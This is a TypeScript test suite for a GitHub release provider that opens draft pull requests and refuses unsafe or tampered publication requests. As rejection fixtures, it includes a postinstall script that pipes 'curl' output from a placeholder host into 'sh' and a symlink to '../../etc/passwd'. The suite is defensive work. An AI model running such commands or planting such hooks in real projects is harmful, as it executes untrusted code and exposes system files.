import { expect, test } from "bun:test";
import { ProjectGitHubHttpError } from "../extensions/project-github-transport";
import { FactoryGitHubFake } from "../__tests__/helpers/factory-github-fake";
import { digestBytes, digestObject } from "../extensions/v4/blobs";
import { factoryGitCommitId, factoryGitTreeId, type FactoryGitFile, type FactoryGitIdentity } from "./git-objects";
import {
  FACTORY_GITHUB_OPERATION_MARKER,
  FactoryGitHubError,
  FactoryGitHubReleaseProvider,
  assertFactoryGitHubPublicationRequest,
  type FactoryGitHubPublicationRequest,
} from "./release-github";
import { factoryGitBranchBinding } from "./release-git-refs";
import type { FactoryReleaseClaim } from "./releases";

const REPOSITORY = "ezcorp-org/factory-platform-publication-tests";
const REPOSITORY_ID = 1_368_432_892;
const BASE_BRANCH = "main";
const IDENTITY: FactoryGitIdentity = { name: "EZCorp Factory", email: "factory@ezcorp.invalid", atSeconds: 1_700_000_000, timezone: "+0000" };
const OPERATION_ID = `factory-release:${"a1b2c3d4e5f6".repeat(6).slice(0, 64)}`;
const BINDING = factoryGitBranchBinding(OPERATION_ID);
const encoder = new TextEncoder();
const text = (value: string) => encoder.encode(value);

const BASE_FILES: readonly FactoryGitFile[] = [
  { path: "package.json", mode: "100644", content: text(`{"name":"pack","version":"1.0.0","dependencies":{"left-pad":"1.3.0"}}\n`) },
  { path: "bun.lock", mode: "100644", content: text("lockfile-v1\n") },
  { path: "src/slugify.ts", mode: "100644", content: text("export const slugify = (value: string) => value;\n") },
  { path: "tests/slugify.test.ts", mode: "100644", content: text("// protected test\n") },
];

const CANDIDATE_FILES: readonly FactoryGitFile[] = BASE_FILES.map(file =>
  file.path === "src/slugify.ts"
    ? { ...file, content: text('export const slugify = (value: string) => value.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");\n') }
    : file);

function fake(): FactoryGitHubFake {
  return new FactoryGitHubFake({ repository: REPOSITORY, repositoryId: REPOSITORY_ID, baseBranch: BASE_BRANCH, baseFiles: BASE_FILES, identity: IDENTITY });
}

function publicationRequest(server: FactoryGitHubFake, overrides: Partial<FactoryGitHubPublicationRequest> = {}, files: readonly FactoryGitFile[] = CANDIDATE_FILES): FactoryGitHubPublicationRequest {
  const treeSha = factoryGitTreeId(files);
  const commitMessage = "Publish the accepted slugify candidate\n";
  const commitSha = factoryGitCommitId({ treeId: treeSha, parents: [server.baseCommitSha], author: IDENTITY, committer: IDENTITY, message: commitMessage });
  const title = "Accepted candidate: slugify";
  const body = `Tested base ${server.baseCommitSha} on ${BASE_BRANCH}.\n\n${FACTORY_GITHUB_OPERATION_MARKER} ${OPERATION_ID}\n`;
  const lock = files.find(file => file.path === "bun.lock")!;
  return {
    schemaVersion: "factory.github-publication.v1",
    repositoryId: REPOSITORY_ID, baseBranch: BASE_BRANCH, baseSha: server.baseCommitSha,
    treeSha, commitSha, commitMessage, author: IDENTITY, committer: IDENTITY,
    title, body, titleBodyDigest: `sha256:${digestObject({ title, body })}`,
    dependencyLockPath: "bun.lock", dependencyLockDigest: `sha256:${digestBytes(lock.content)}`,
    protectedPaths: ["tests/slugify.test.ts"], allowedPaths: ["src/"],
    files: files.map(file => ({ path: file.path, mode: file.mode, contentBase64: Buffer.from(file.content).toString("base64") })),
    ...overrides,
  };
}

function operation(request: FactoryGitHubPublicationRequest): FactoryReleaseClaim {
  return {
    tenantId: "tenant", projectId: "project", operationId: OPERATION_ID, runId: "run", nodeInstanceId: "release", candidateGeneration: 0,
    candidateDigest: `sha256:${"a".repeat(64)}`, decisionId: "decision", contractDigest: `sha256:${"b".repeat(64)}`,
    executionEpoch: 1, cancellationEpoch: 0, releaseEnableEpoch: 1, action: "publish",
    destination: { provider: "github", account: REPOSITORY, object: `pull-request/${request.baseBranch}/${request.commitSha}` },
    request, destinationDigest: `sha256:${"c".repeat(64)}`, requestDigest: `sha256:${"d".repeat(64)}`,
    material: { decisionId: "decision", evidence: [{}], packageTrustDigest: `sha256:${"e".repeat(64)}`, validatorTrustDigest: `sha256:${"f".repeat(64)}` },
    materialDigest: `sha256:${"0".repeat(64)}`, estimatedSpendMicros: 0, deadlineMs: 2_000_000_000_000,
    state: "executing", dispatchGeneration: 1, dispatchStarted: true, senderToken: "sender", archiveReady: true,
    destinationRef: BINDING.ref, destinationBranch: BINDING.branch,
    authority: { kind: "approval", id: "approval" },
  };
}

function provider(server: FactoryGitHubFake): FactoryGitHubReleaseProvider {
  return new FactoryGitHubReleaseProvider({
    repository: REPOSITORY, projectId: "project", authorize: async () => {}, readToken: async () => "fixture-token", request: server.request,
  });
}

test("one draft pull request is opened on one unique branch, and every identity is verified", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  const receipt = await provider(server).publish(claim);

  expect(receipt).toMatchObject({
    provider: "github", account: REPOSITORY, object: claim.destination.object, operationId: OPERATION_ID, dispatchGeneration: 1,
    version: request.commitSha, ref: BINDING.ref, branch: BINDING.branch, providerReceiptId: `github:${REPOSITORY_ID}:pull:1`,
  });
  expect(server.refs.get(BINDING.branch)).toBe(request.commitSha);
  expect(server.pulls).toHaveLength(1);
  expect(server.pulls[0]).toMatchObject({ draft: true, state: "open", head: { ref: BINDING.branch, sha: request.commitSha }, base: { ref: BASE_BRANCH } });
  expect(server.pulls[0]!.body).toContain(`${FACTORY_GITHUB_OPERATION_MARKER} ${OPERATION_ID}`);

  // The commit GitHub stored has the tested base as its only parent and the accepted tree.
  const stored = server.commits.get(request.commitSha)!;
  expect(stored.parents.map(parent => parent.sha)).toEqual([server.baseCommitSha]);
  expect(stored.tree.sha).toBe(request.treeSha);

  // Nothing that could force a ref or merge a pull request was ever sent.
  expect(server.calls.filter(call => ["PATCH", "PUT", "DELETE"].includes(call.method))).toEqual([]);
  expect(server.calls.filter(call => call.path.includes("/merge"))).toEqual([]);
  expect(await provider(server).verifyReceipt(claim, receipt, { lookup: true })).toBe(true);
  expect(await provider(server).proveNoEffect(claim, { operationId: OPERATION_ID })).toBe(false);
});

test("a dropped response after the branch create recovers by reading that exact ref", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);

  // The first attempt creates the ref and then loses the pull-request response.
  server.failNext = { method: "POST", pathIncludes: "/pulls", status: 502 };
  await expect(provider(server).publish(claim)).rejects.toBeInstanceOf(ProjectGitHubHttpError);
  expect(server.refs.get(BINDING.branch)).toBe(request.commitSha);
  expect(server.pulls).toHaveLength(0);

  // The retry finds the ref already at its own commit and continues without forcing anything.
  const receipt = await provider(server).publish(claim);
  expect(receipt.version).toBe(request.commitSha);
  expect(server.pulls).toHaveLength(1);
  expect(server.calls.filter(call => call.method === "POST" && call.path.endsWith("/git/refs"))).toHaveLength(2);
});

test("a dropped response after the pull request create recovers by head, base, and marker", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  await provider(server).publish(claim);
  const created = server.pulls[0]!;

  // A second publication under the same claim: the ref exists, the POST is refused, and the
  // lookup finds the one pull request this operation's marker names. No second POST succeeds.
  server.failNext = { method: "POST", pathIncludes: "/pulls", status: 422 };
  const receipt = await provider(server).publish(claim);
  expect(receipt.providerReceiptId).toBe(`github:${REPOSITORY_ID}:pull:${created.number}`);
  expect(server.pulls).toHaveLength(1);
});

test("several matching pull requests, or one without the marker, need an operator", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  await provider(server).publish(claim);
  server.pulls.push({ ...server.pulls[0]!, number: 99 });
  server.failNext = { method: "POST", pathIncludes: "/pulls", status: 422 };
  await expect(provider(server).publish(claim)).rejects.toMatchObject({ code: "factory_github_pull_ambiguous" });

  const other = fake();
  const otherRequest = publicationRequest(other);
  const otherClaim = operation(otherRequest);
  await provider(other).publish(otherClaim);
  other.pulls[0]!.body = "someone replaced the body";
  other.failNext = { method: "POST", pathIncludes: "/pulls", status: 422 };
  await expect(provider(other).publish(otherClaim)).rejects.toMatchObject({ code: "factory_github_pull_ambiguous" });
});

test("an empty lookup after a lost create stays uncertain rather than sending again", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  server.failNext = { method: "POST", pathIncludes: "/pulls", status: 500 };
  await expect(provider(server).publish(claim)).rejects.toBeInstanceOf(ProjectGitHubHttpError);
  // One create was attempted, one lookup answered nothing, and no second create was sent.
  expect(server.calls.filter(call => call.method === "POST" && call.path.endsWith("/pulls"))).toHaveLength(1);
  expect(server.pulls).toEqual([]);
});

test("a branch already pointing somewhere else is a conflict, never a force update", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  server.refs.set(BINDING.branch, server.baseCommitSha);
  await expect(provider(server).publish(claim)).rejects.toMatchObject({ code: "factory_github_ref_conflict" });
  expect(server.refs.get(BINDING.branch)).toBe(server.baseCommitSha);
  expect(server.calls.filter(call => call.method !== "GET" && call.path.includes("/git/refs"))).toHaveLength(1);
});

test("a protected asset, an out-of-scope path, or a changed lock never reaches the remote", async () => {
  const changedProtected = CANDIDATE_FILES.map(file => file.path === "tests/slugify.test.ts" ? { ...file, content: text("// removed the protected test\n") } : file);
  const outOfScope = [...CANDIDATE_FILES, { path: "docs/readme.md", mode: "100644" as const, content: text("new\n") }];
  const deleted = CANDIDATE_FILES.filter(file => file.path !== "tests/slugify.test.ts");

  for (const [files, code] of [[changedProtected, "factory_github_protected_asset_changed"], [outOfScope, "factory_github_path_not_allowed"], [deleted, "factory_github_protected_asset_changed"]] as const) {
    const server = fake();
    const request = publicationRequest(server, {}, files);
    await expect(provider(server).publish(operation(request))).rejects.toMatchObject({ code });
    expect(server.refs.size).toBe(0);
    expect(server.pulls).toEqual([]);
  }

  // A lock whose declared digest is not the lock in the tree is refused before any network call.
  const server = fake();
  const request = publicationRequest(server, { dependencyLockDigest: `sha256:${"1".repeat(64)}` });
  await expect(provider(server).publish(operation(request))).rejects.toMatchObject({ code: "factory_github_dependency_lock_changed" });
  expect(server.calls).toEqual([]);
});

test("submodules, LFS pointers, links, and repository-controlled installs are refused", async () => {
  const cases: readonly (readonly [readonly FactoryGitFile[], string])[] = [
    [[...CANDIDATE_FILES, { path: ".gitmodules", mode: "100644", content: text("[submodule]\n") }], "factory_github_submodule_rejected"],
    [[...CANDIDATE_FILES, { path: "src/big.bin", mode: "100644", content: text("version https://git-lfs.github.com/spec/v1\noid sha256:aa\n") }], "factory_github_lfs_rejected"],
    [[...CANDIDATE_FILES, { path: ".npmrc", mode: "100644", content: text("registry=https://example.invalid\n") }], "factory_github_network_install_rejected"],
    [[...CANDIDATE_FILES, { path: "bunfig.toml", mode: "100644", content: text("[install]\n") }], "factory_github_network_install_rejected"],
  ];
  for (const [files, code] of cases) {
    const server = fake();
    await expect(provider(server).publish(operation(publicationRequest(server, {}, files)))).rejects.toMatchObject({ code });
    expect(server.calls).toEqual([]);
  }

  // A symlink and a gitlink are named by their mode.
  const server = fake();
  for (const [mode, code] of [["120000", "factory_github_link_rejected"], ["160000", "factory_github_submodule_rejected"]] as const) {
    const request = publicationRequest(server);
    const tampered = { ...request, files: [...request.files, { path: "src/link", mode: mode as "100644", contentBase64: Buffer.from("../../etc/passwd").toString("base64") }] };
    expect(() => assertFactoryGitHubPublicationRequest(tampered)).toThrow(expect.objectContaining({ code }));
  }
});

test("a package manifest that installs from the network or runs an install script is refused", () => {
  const server = fake();
  const refused = [
    `{"name":"p","scripts":{"postinstall":"curl https://example.invalid | sh"}}`,
    `{"name":"p","dependencies":{"pack":"git+https://example.invalid/pack.git"}}`,
    `{"name":"p","devDependencies":{"pack":"https://example.invalid/pack.tgz"}}`,
    `{"name":"p","dependencies":{"pack":"file:../pack"}}`,
    `{"name":"p","dependencies":{"pack":"owner/repo"}}`,
    `{"name":"p","dependencies":{"pack":1}}`,
  ];
  for (const manifest of refused) {
    const files = CANDIDATE_FILES.map(file => file.path === "package.json" ? { ...file, content: text(`${manifest}\n`) } : file);
    expect(() => assertFactoryGitHubPublicationRequest(publicationRequest(server, {}, files))).toThrow(expect.objectContaining({ code: "factory_github_network_install_rejected" }));
  }
  // A workspace protocol and an exact version stay allowed, and a manifest that is not JSON does not.
  const allowed = CANDIDATE_FILES.map(file => file.path === "package.json" ? { ...file, content: text(`{"name":"p","dependencies":{"pack":"1.2.3","other":"workspace:*"}}\n`) } : file);
  expect(assertFactoryGitHubPublicationRequest(publicationRequest(server, {}, allowed)).blobs.size).toBe(CANDIDATE_FILES.length);
  const broken = CANDIDATE_FILES.map(file => file.path === "package.json" ? { ...file, content: text("not json\n") } : file);
  expect(() => assertFactoryGitHubPublicationRequest(publicationRequest(server, {}, broken))).toThrow(expect.objectContaining({ code: "factory_github_request_invalid" }));
});

test("a request that does not contain the candidate it names is refused before any network call", async () => {
  const server = fake();
  const request = publicationRequest(server);
  for (const overrides of [
    { treeSha: factoryGitTreeId(BASE_FILES) },
    { commitSha: server.baseCommitSha },
    { baseSha: `${"9".repeat(40)}` },
  ]) {
    const tampered = { ...request, ...overrides };
    expect(() => assertFactoryGitHubPublicationRequest(tampered)).toThrow(expect.objectContaining({ code: "factory_github_identity_mismatch" }));
  }
  // A title or body the digest does not cover is refused too.
  expect(() => assertFactoryGitHubPublicationRequest({ ...request, title: "another title" })).toThrow(expect.objectContaining({ code: "factory_github_request_invalid" }));
  const claim = operation(request);
  await expect(provider(server).publish({ ...claim, request: { ...request, title: "another title" } })).rejects.toMatchObject({ code: "factory_github_request_invalid" });
  expect(server.calls).toEqual([]);
});

test("every malformed request shape is refused with the same invalid code", () => {
  const server = fake();
  const request = publicationRequest(server);
  const rejected: readonly unknown[] = [
    null, [], "string", 7,
    { ...request, schemaVersion: "factory.github-publication.v2" },
    { ...request, extra: true },
    (() => { const { title: _title, ...rest } = request; return rest; })(),
    { ...request, repositoryId: 0 },
    { ...request, repositoryId: 1.5 },
    { ...request, baseBranch: "bad branch" },
    { ...request, title: "   ", titleBodyDigest: `sha256:${digestObject({ title: "   ", body: request.body })}` },
    { ...request, files: [] },
    { ...request, files: [{ path: "a", mode: "100644" }] },
    { ...request, files: [{ path: "a", mode: "100644", contentBase64: "not base64!!" }] },
    { ...request, files: [...request.files, request.files[0]!] },
    { ...request, protectedPaths: "no" },
    { ...request, allowedPaths: [] },
    { ...request, commitMessage: "" },
    { ...request, author: { ...request.author, timezone: "+0100" } },
    { ...request, author: { name: "a", email: "b", atSeconds: 1 } },
  ];
  for (const [index, value] of rejected.entries()) {
    let error: unknown = null;
    try { assertFactoryGitHubPublicationRequest(value); } catch (cause) { error = cause; }
    expect([index, error instanceof FactoryGitHubError]).toEqual([index, true]);
  }
  expect(() => assertFactoryGitHubPublicationRequest({ ...request, protectedPaths: ["missing/file"] })).toThrow(expect.objectContaining({ code: "factory_github_protected_asset_changed" }));
  expect(() => assertFactoryGitHubPublicationRequest({ ...request, dependencyLockPath: "missing.lock" })).toThrow(expect.objectContaining({ code: "factory_github_dependency_lock_changed" }));
});

test("a foreign repository, destination, ref, or expected version is refused", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  const target = provider(server);
  for (const tampered of [
    { ...claim, destination: { ...claim.destination, provider: "s3" } },
    { ...claim, destination: { ...claim.destination, account: "someone/else" } },
    { ...claim, destinationRef: undefined, destinationBranch: undefined },
    { ...claim, destinationRef: "refs/heads/ezcorp-factory/other", destinationBranch: "ezcorp-factory/other" },
  ] as FactoryReleaseClaim[]) {
    await expect(target.publish(tampered)).rejects.toMatchObject({ code: "factory_github_foreign_target" });
  }
  for (const tampered of [
    { ...claim, destination: { ...claim.destination, object: "pull-request/main/other" } },
    { ...claim, destination: { ...claim.destination, expectedVersion: "x" } },
  ] as FactoryReleaseClaim[]) {
    await expect(target.publish(tampered)).rejects.toMatchObject({ code: "factory_github_foreign_target" });
  }
  // A body without the operation marker cannot be published under that operation.
  const unmarked = { ...request, body: "no marker", titleBodyDigest: `sha256:${digestObject({ title: request.title, body: "no marker" })}` };
  await expect(target.publish({ ...claim, request: unmarked })).rejects.toMatchObject({ code: "factory_github_request_invalid" });
  expect(() => new FactoryGitHubReleaseProvider({ repository: "not-a-repository", projectId: "p", authorize: async () => {}, readToken: async () => null })).toThrow(FactoryGitHubError);
});

test("a base the remote does not have, a renamed repository, and a truncated base listing all stop the publication", async () => {
  const missingBase = fake();
  const missing = publicationRequest(missingBase);
  missingBase.commits.delete(missingBase.baseCommitSha);
  await expect(provider(missingBase).publish(operation(missing))).rejects.toMatchObject({ code: "factory_github_base_unknown" });

  const renamed = new FactoryGitHubFake({ repository: REPOSITORY, repositoryId: 42, baseBranch: BASE_BRANCH, baseFiles: BASE_FILES, identity: IDENTITY });
  await expect(provider(renamed).publish(operation(publicationRequest(renamed)))).rejects.toMatchObject({ code: "factory_github_foreign_target" });

  const truncated = fake();
  truncated.truncateBaseTree = true;
  await expect(provider(truncated).publish(operation(publicationRequest(truncated)))).rejects.toMatchObject({ code: "factory_github_base_tree_truncated" });
});

test("receipt verification and absence proof read the remote and never write to it", async () => {
  const server = fake();
  const request = publicationRequest(server);
  const claim = operation(request);
  const target = provider(server);

  // Before any publication the absence proof holds and verification does not.
  expect(await target.proveNoEffect(claim, { operationId: OPERATION_ID })).toBe(true);
  expect(await target.proveNoEffect(claim, { operationId: "another" })).toBe(false);
  expect(await target.proveNoEffect(claim, null)).toBe(false);

  const receipt = await target.publish(claim);
  const writes = server.calls.filter(call => call.method !== "GET").length;
  expect(await target.verifyReceipt(claim, receipt, {})).toBe(true);
  expect(await target.verifyReceipt(claim, { ...receipt, effectDigest: `sha256:${"2".repeat(64)}` }, {})).toBe(false);
  expect(await target.verifyReceipt(claim, { ...receipt, providerReceiptId: `github:${REPOSITORY_ID}:pull:404` }, {})).toBe(false);
  expect(await target.verifyReceipt(claim, { ...receipt, providerReceiptId: "github:x:pull:not-a-number" }, {})).toBe(false);
  expect(await target.proveNoEffect(claim, { operationId: OPERATION_ID })).toBe(false);
  expect(server.calls.filter(call => call.method !== "GET").length).toBe(writes);

  // A pull request that no longer matches its receipt fails verification rather than throwing.
  server.pulls[0]!.draft = false;
  expect(await target.verifyReceipt(claim, receipt, {})).toBe(false);
  server.pulls[0]!.draft = true;
  server.refs.set(BINDING.branch, server.baseCommitSha);
  expect(await target.verifyReceipt(claim, receipt, {})).toBe(false);
  expect(await target.proveNoEffect(claim, { operationId: OPERATION_ID })).toBe(false);
  server.refs.delete(BINDING.branch);
  // With the ref gone but a pull request still naming the head, absence is not proved.
  expect(await target.proveNoEffect(claim, { operationId: OPERATION_ID })).toBe(false);
});
